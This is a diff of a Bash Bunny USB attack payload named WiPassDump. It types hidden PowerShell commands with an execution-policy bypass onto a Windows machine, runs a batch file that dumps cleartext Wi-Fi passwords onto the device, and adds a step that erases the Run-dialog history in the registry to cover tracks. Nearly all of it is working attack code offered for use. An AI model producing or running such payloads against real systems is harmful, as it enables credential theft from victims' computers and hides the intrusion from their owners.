@@ -2,13 +2,19 @@
 #
 # Title:         WiPassDump
 # Author:        samdeg555
-# Version:       1.0
+# Edited by:     viperguy07
+# Version:       1.2
 # Target:        Windows
 # 
-# Runs powershell as Administrator
-# Bypasses UAC
+# Runs powershell as Administrator in hidden mode
 # Dumps cleartext Wi-Fi passwords and infos to the Bash Bunny
+# Clean up tracks
+# Options
+#  - Line 16 clean tracks yes or no
+#  - Line 28 set keyboard language
 #
+# Do you want to clean your tracks
+CLEARTRACKS="yes" # yes or no
 
 LED R 200
 
@@ -18,38 +24,34 @@ mkdir -p /root/udisk/loot/WiPassDump
 # Source bunny_helpers.sh to get environment variable SWITCH_POSITION
 source bunny_helpers.sh
 
-# Set language accordingly
+# Set language accordingly 'us' for United States
 Q SET_LANGUAGE ca
 
 ATTACKMODE HID STORAGE
 
 LED B 200
 
-# Launch powershell as admin
+# Launch powershell as admin and hidden
 Q GUI r
-Q DELAY 100
-Q STRING powershell Start-Process powershell -Verb runAs
-Q ENTER
-
-# Bypass UAC
-Q DELAY 3000
-Q ALT o
+Q DELAY 1000
+Q STRING powershell -WindowStyle Hidden -exec bypass '.((gwmi win32_volume -f '"'"'label='"''"'BashBunny'"'''"').Name+'"'"'payloads/'$SWITCH_POSITION'/a.cmd'"'"')'
 Q ENTER
 Q DELAY 500
-
-# Start a.cmd
-Q STRING '.((gwmi win32_volume -f '"'"'label='"''"'BashBunny'"'''"').Name+'"'"'payloads/'
-Q STRING $SWITCH_POSITION
-Q STRING '/a.cmd'"'"')'
-Q ENTER
 
 # Wait for a.cmd to finish and exit
 
 LED R B 500
 
 Q DELAY 3000
-Q STRING exit
-Q ENTER
+
+# Clear tracks?
+if [ $CLEARTRACKS == "yes" ]; then
+   Q DELAY 500
+   Q GUI r
+   Q DELAY 500
+   Q STRING powershell -WindowStyle Hidden -Exec Bypass "Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue"
+   Q ENTER
+fi
 
 sync
 
